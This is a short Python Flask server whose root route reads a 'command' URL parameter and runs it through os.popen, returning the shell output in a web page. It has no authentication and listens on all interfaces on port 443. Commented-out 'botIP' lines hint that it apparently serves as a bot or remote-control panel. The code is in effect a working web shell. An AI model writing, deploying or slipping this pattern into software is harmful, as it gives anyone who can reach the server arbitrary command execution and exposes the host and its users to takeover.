#!/usr/bin/python3
from flask import Flask, render_template, request
import os
import wtforms

app = Flask(__name__)


@app.route('/hw')
def hw():
	return 'Hello World'
	
	
@app.route('/index')
def index():
	return render_template('index.html')
	
@app.route('/')
def cmd():
	#botIP = request.args.get('botIP')
	command = request.args.get('command')
	output = os.popen(str(command)).read()
	#print(output)
	return render_template('form.html', command=command, output=output)#, botIP=botIP)
	
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=443, ssl_context=("./certs/cert.pem", "./certs/key.pem"))
